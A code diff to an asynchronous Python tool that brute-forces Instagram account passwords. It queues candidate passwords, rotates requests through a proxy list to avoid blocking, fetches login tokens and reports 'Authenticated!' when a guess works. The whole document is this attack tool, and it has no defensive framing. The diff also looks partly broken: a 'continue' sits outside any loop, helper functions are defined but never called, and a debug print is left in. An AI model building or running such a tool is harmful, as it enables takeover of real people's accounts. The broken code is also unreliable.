@@ -4,7 +4,6 @@ import logging
 import logging.config
 
 import asyncio
-import time
 import signal
 
 from app import settings
@@ -181,7 +180,7 @@ class EngineAsync(Engine):
             asyncio.gather_tasks call.
             """
             tokens = await asyncio.ensure_future(self.get_tokens(loop))
-
+            print(tokens)
             attack_tasks = (
                 loop.create_task(
                     self.handle_exception(
@@ -203,7 +202,7 @@ class EngineAsync(Engine):
             loop.stop()
 
     @auto_logger(show_running=False)
-    async def consume_attempts(self, tokens, log):
+    async def consume_attempts(self, loop, log):
         while not self.stop_event.is_set():
             try:
                 attempt = self.attempts.get_nowait()
@@ -215,7 +214,13 @@ class EngineAsync(Engine):
                     self.user.add_password_attempt(attempt)
 
     @auto_logger(show_running=False)
-    async def consume_passwords(self, tokens, log):
+    async def consume_passwords(self, tokens, loop, log):
+        """
+        Right now, we are going to try with only one token.  If we start running
+        into issues, we can incorporate functionality to use backup tokesn if
+        available.
+        """
+        token = tokens[0]
 
         def callback(fut):
             exc = fut.exception()
@@ -225,48 +230,66 @@ class EngineAsync(Engine):
                     self.proxy_list.remove(exc.proxy)
                 else:
                     self.log.errors(str(exc))
-
-        # def callback(fut):
-        #     exc = fut.exception()
-        #     if exc:
-        #         if isinstance(exc, exceptions.BadProxyException):
-        #             self.log.warn(str(exc))
-        #             self.proxy_list.remove(proxy)
-        #         else:
-        #             raise exc
-        #     else:
-        #         result = fut.result()
-        #         if result.accessed:
-        #             log.success(f"Authenticated!")
-        #             self.stop_event.set()
-        #         else:
-        #             self.attempts.put_nowait(password)
-
-        while not self.stop_event.is_set():
-            try:
-                password = self.passwords.get_nowait()
-            except asyncio.QueueEmpty:
-                continue
             else:
-                async with InstagramSession() as session:
-                    assert self.token is not None
+                result = fut.result()
+                if result.accessed:
+                    log.success(f"Authenticated!")
+                    self.stop_event.set()
+                # else:
+                #     self.attempts.put_nowait(password)
 
-                    tasks = []
-                    while not self.stop_event.is_set() and len(self.proxy_list):
-                        async with self.lock:
-                            proxy = self.proxy_list[0]
+        # We might want to login in batches of passwords.
+        # We also have to make sure we do not run out of proxies!!
+        async def get_authentication_results():
+            tasks = []
+            async with self.lock:
+                proxy = self.proxy_list[0]
 
-                        task = asyncio.ensure_future(session.login(
-                            self.user.username,
-                            password,
-                            self.token,
-                            proxy,
-                        ))
+            async with InstagramSession() as session:
+                for i in range(25):
 
-                        task.add_done_callback(callback)
-                        tasks.append(task)
+                    proxy = self.proxy_list[i]
+                    task = asyncio.ensure_future(session.get_token(proxy))
+                    task.add_done_callback(callback)
+                    tasks.append(task)
 
-                    await asyncio.gather(*tasks, return_exceptions=True)
+                return await asyncio.gather(*tasks, return_exceptions=True)
+
+        async def filter_tokens(results):
+            """
+            For whatever reason, raising TokenNotInResponse in the session
+            is causing a None value to be returned instead of the exception.
+            For now, we will just filter out None as well.
+            """
+            tokens = []
+            for result in results:
+                if not isinstance(result, Exception) and result is not None:
+                    tokens.append(result)
+            return tokens
+
+        try:
+            password = self.passwords.get_nowait()
+        except asyncio.QueueEmpty:
+            continue
+        else:
+            async with InstagramSession() as session:
+
+                tasks = []
+                while not self.stop_event.is_set() and len(self.proxy_list):
+                    async with self.lock:
+                        proxy = self.proxy_list[0]
+
+                    task = asyncio.ensure_future(session.login(
+                        self.user.username,
+                        password,
+                        token,
+                        proxy,
+                    ))
+
+                    task.add_done_callback(callback)
+                    tasks.append(task)
+
+                await asyncio.gather(*tasks, return_exceptions=True)
 
     async def handle_exception(self, coro, loop):
         """
